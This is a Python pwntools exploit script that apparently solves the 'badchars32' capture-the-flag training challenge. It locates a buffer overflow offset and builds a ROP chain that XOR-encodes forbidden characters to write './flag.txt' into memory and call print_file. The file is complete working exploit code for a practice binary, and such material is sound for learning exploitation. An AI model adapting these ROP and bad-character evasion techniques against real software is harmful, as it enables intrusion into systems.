import pwn
import string

REGISTER_SIZE = 4
KEY = 90
BADCHRS = "agx."
ALPHABET = bytes("".join([c for c in string.hexdigits if c not in BADCHRS]), "utf-8")
TO_WRITE = "./flag.txt\0"
xor_ebp_addr_by_bl = 0x08048547
mov_esi_to_edi_addr = 0x0804854f

def write_in_memory(rop, addr, data, offset=0):
    rop.raw(rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"]))
    rop.raw(data[:REGISTER_SIZE].ljust(REGISTER_SIZE, '\0'))
    rop.raw(addr + offset)
    rop.raw(b"A" * REGISTER_SIZE)
    rop.raw(mov_esi_to_edi_addr)
    if len(data) > REGISTER_SIZE:
        if (diff := len(data) - REGISTER_SIZE) < REGISTER_SIZE:
            write_in_memory(rop, addr, data[diff:], offset + diff)
        else:
            write_in_memory(rop, addr, data[REGISTER_SIZE:], offset + REGISTER_SIZE)

def unxor_in_memory(rop, addr):
    rop.raw(rop.find_gadget(["pop ebx", "ret"]))
    rop.raw(pwn.p32(KEY))
    rop.raw(rop.find_gadget(["pop ebp", "ret"]))
    rop.raw(addr)
    rop.raw(xor_ebp_addr_by_bl)

class Exploit:
    def __init__(self, path):
        self.path = path
        pwn.context.log_level = 'warning'
        pwn.context.binary = pwn.ELF(path)

    def find_offset(self):

        pwn.warning("Starting test process to find buffer size...")
        process = pwn.process(self.path)
        de_bruijn = pwn.cyclic(128, ALPHABET)
        process.sendline(de_bruijn)
        process.wait()
        core = process.corefile
        stack = core.esp # rsp (64 bits) / esp (32 bits)
        self.offset = de_bruijn.find(core.read(stack, 4)) - 4 # -4 if esp
        pwn.warning(f"Found pattern at offset {self.offset}")

    def craft_payload(self):
        pwn.warning("Crafting payload...")
        elf = pwn.ELF(self.path)
        rop = pwn.ROP(elf, badchars=b"xga.")

        addr = elf.get_section_by_name('.data').header.sh_addr # + elf.address

        idx_to_xor = (i for (i,c) in enumerate(TO_WRITE) if c in BADCHRS)
        xored_to_write = "".join(map(chr, [c ^ KEY if c in map(ord, BADCHRS) else c for c in map(ord, TO_WRITE)]))

        write_in_memory(rop, addr, xored_to_write)
        for i in idx_to_xor:
            unxor_in_memory(rop, addr + i)
        rop.call(elf.plt["print_file"], [addr])
        self.payload = pwn.flat({self.offset: rop.chain()})

        with open("payload.txt", "wb+") as fd:
            fd.write(self.payload)

    def exploit(self):
        pwn.warning("Starting final process for exploitation...")
        process = pwn.process(self.path)
        pwn.atexit.register(process.clean_and_log)
        process.sendline(self.payload)
        pwn.warning(process.recvallS())

exploit = Exploit("./badchars32")
exploit.find_offset()
exploit.craft_payload()
exploit.exploit()
